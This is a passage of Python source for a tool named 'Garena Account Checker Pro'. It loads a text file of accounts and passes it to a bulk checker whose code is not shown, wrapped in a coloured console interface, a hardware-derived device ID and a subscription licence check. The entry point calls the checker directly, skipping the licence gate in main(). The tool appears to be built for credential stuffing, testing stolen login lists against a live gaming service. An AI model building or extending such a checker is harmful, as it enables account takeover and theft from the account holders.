            pbar.update(1)
            system_info.append(platform.processor())
            pbar.update(1)

        # Generate unique ID
        print_status("Generating unique identifier...", "debug")
        hardware_id = "-".join(system_info)
        unique_id = uuid.uuid5(uuid.NAMESPACE_DNS, hardware_id)
        device_hash = hashlib.sha256(unique_id.bytes).hexdigest()
        device_id = f"{user_name}_{device_hash[:8]}"

        # Save the device ID
        with open(file_path, 'w') as file:
            file.write(device_id)
        print_status(f"New device ID generated: {device_id}", "success")
        
        return device_id

def taeee(jarell):
    """Main function to handle account checking with enhanced UI"""
    clear_screen()
    display_banner()
    
    # Enhanced file selection with visual feedback
    print_status("Please provide the account file path", "info")
    file_path = input(f"{Colors.YELLOW}Enter path or press Enter to auto-detect: {Colors.RESET}").strip()
    
    if not file_path:
        print_status("Searching for account files...", "debug")
        file_path = find_nearest_account_file()
    
    # Validate file path
    while True:
        if os.path.isfile(file_path) and file_path.endswith('.txt'):
            print_status(f"Using account file: {file_path}", "success")
            break
        else:
            print_status("Invalid file path. Please provide a valid .txt file", "error")
            file_path = input(f"{Colors.YELLOW}Enter valid file path: {Colors.RESET}").strip()
    
    # Start checking with confirmation
    print_status(f"Ready to check accounts from: {file_path}", "info")
    input(f"{Colors.YELLOW}Press Enter to start or Ctrl+C to cancel...{Colors.RESET}")
    
    try:
        bulk_check(file_path)
    except KeyboardInterrupt:
        print_status("Operation cancelled by user", "warning")
        return

def main():
    """Main application entry point with enhanced startup sequence"""
    try:
        # Startup sequence
        clear_screen()
        print(f"{Colors.CYAN}Initializing Garena Account Checker Pro...{Colors.RESET}")
        time.sleep(0.5)
        
        # Display banner with animation
        for i in range(3):
            print(f"{Colors.YELLOW}Loading{'.' * (i+1)}{Colors.RESET}", end='\r')
            time.sleep(0.3)
        print()
        
        display_banner()
        
        # Device registration process
        print_status("Verifying device registration...", "info")
        device_id = get_device_id()
        print(f"\n{Colors.GREEN}╔════════════════════════════════════════════════════════════════╗")
        print(f"{Colors.GREEN}║ {Colors.BOLD}{Colors.CYAN}DEVICE INFORMATION {Colors.RESET}{Colors.GREEN}                                  ║")
        print(f"{Colors.GREEN}╠════════════════════════════════════════════════════════════════╣")
        print(f"{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Device ID: {Colors.CYAN}{device_id}")
        print(f"{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}System: {Colors.CYAN}{platform.system()} {platform.release()}")
        print(f"{Colors.GREEN}║ {Colors.WHITE}• {Colors.YELLOW}Processor: {Colors.CYAN}{platform.processor()}")
        print(f"{Colors.GREEN}╚════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        
        # Subscription check
        print_status("Checking subscription status...", "info")
        jarell = device_id.split('_')[0]
        
        while True:
            subscription_status = check_subscription(device_id)
            
            if subscription_status == "info":
                print(f"\n{Colors.GREEN}╔════════════════════════════════════════════════════════════════╗")
                print(f"{Colors.GREEN}║ {Colors.BOLD}{Colors.CYAN}SUBSCRIPTION ACTIVE {Colors.RESET}{Colors.GREEN}                                   ║")
                print(f"{Colors.GREEN}╚════════════════════════════════════════════════════════════════╝{Colors.RESET}")
                time.sleep(1)
                clear_screen()
                taeee(jarell)
                break
            elif subscription_status == "InternetIPCHANGED":
                print_status("NO INTERNET CONNECTION", "error")
                return "No internet"
            else:
                print_status("Device not authorized. Retrying in 5 seconds...", "error")
                time.sleep(5)
        
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Exiting program...{Colors.RESET}")
        sys.exit(0)

if __name__ == "__main__":
    taeee("ToJi")